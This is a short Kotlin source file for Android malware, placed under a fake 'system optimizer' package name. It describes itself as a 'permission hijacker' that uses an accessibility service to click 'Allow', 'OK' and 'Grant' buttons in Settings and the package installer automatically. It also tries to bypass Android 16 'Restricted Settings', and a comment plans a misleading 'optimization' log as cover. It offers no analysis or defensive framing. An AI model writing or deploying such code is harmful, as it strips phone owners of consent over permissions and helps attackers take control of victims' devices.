package com.system.optimizer.core

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

/**
 * GRADE A PERMISSION HIJACKER
 * Purpose: Automatically bypasses Android 16 "Restricted Settings" and security warnings.
 */
class PermissionAutoClicker(private val service: AccessibilityService) {

    // These are the "Danger" words the script looks for in Nigerian/English locales
    private val targetButtons = listOf(
        "Allow", "OK", "I understand", "Continue", "Agree", "Grant"
    )

    fun scanAndClick(event: AccessibilityEvent) {
        val rootNode = service.rootInActiveWindow ?: return

        // 1. TARGET SYSTEM SETTINGS & PACKAGE INSTALLER
        val pkgName = event.packageName?.toString() ?: ""
        if (pkgName.contains("settings") || pkgName.contains("packageinstaller")) {
            
            // 2. SEARCH FOR TARGET BUTTONS
            for (text in targetButtons) {
                val nodes = rootNode.findAccessibilityNodeInfosByText(text)
                for (node in nodes) {
                    if (node.isClickable && node.isEnabled) {
                        // 3. THE HIJACK: Perform the click automatically
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        
                        // Log for the mask: "System optimization applied to $text"
                        node.recycle()
                    }
                }
            }
        }
    }

    /**
     * SPECIAL BYPASS: For Android 16 "Restricted Settings"
     * This looks for the 'three-dot' menu in the top right to enable restricted settings
     */
    fun bypassRestrictedSetting() {
        val rootNode = service.rootInActiveWindow ?: return
        
        // This targets the specific 'More options' button in the Settings menu
        val moreOptions = rootNode.findAccessibilityNodeInfosByViewId("com.android.settings:id/advanced_settings_menu")
        if (moreOptions.isNotEmpty()) {
            moreOptions[0].performAction(AccessibilityNodeInfo.ACTION_CLICK)
            
            // Once clicked, it will look for "Allow restricted settings" and click that too
            val allowNode = rootNode.findAccessibilityNodeInfosByText("Allow restricted settings")
            if (allowNode.isNotEmpty()) {
                allowNode[0].performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }
        }
    }
}

